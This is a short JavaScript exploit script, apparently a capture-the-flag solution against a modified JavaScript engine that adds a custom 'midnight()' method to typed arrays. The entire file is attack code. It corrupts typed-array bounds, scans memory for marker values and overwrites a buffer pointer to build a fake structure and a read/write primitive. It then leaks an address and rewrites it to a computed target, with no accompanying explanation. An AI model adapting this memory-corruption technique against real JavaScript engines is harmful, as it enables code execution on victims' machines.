var orig_buf = 0;
var index_to_prim = 0;
var index_to_arr = 0;
var target = 0x80ccd80;
var rw_prim = 0;
var fake_struct = 0;

p=new Uint32Array(16);p[0]=0xc0debab3;p[1]=0xc0deac1d;
q=new Int32Array(32);q[0]=11223344;q[1]=55664433;
p.midnight();

for (i = 0; i < 31337; i++) {
	if(p[i] == 11223344 && p[i+1] == 55664433){
		index_to_arr = i;
		console.log("Success 1! hBuffer Index: " + i.toString(16));
		break;
	}
}

for (i = 0; i < 31337; i++) {
	if(p[i] == 31337){
		if(i < 0x1500){
	//if(p[i] == 31337 && p[i+1] == 67074){
		index_to_prim = i;
		orig_buf = p[i-3];
		console.log("Orig buf: " + orig_buf.toString(16));
		console.log("hbufObj Index: " + i.toString(16));
		fake_struct = (index_to_arr * 4) + orig_buf + 0x18;
		console.log("Success 2! hbuffer addr:" + fake_struct.toString(16));
		p[i-3] = fake_struct;
		}
	}
}

q[0] = 0x80489b6;
q[1] = 0x80489b6;
q[4] = 1337;
q[5] = target;

console.log("Leak: " + p[0].toString(16));
p[0] = (p[0] - 0x31f00) + 0x3cd60;
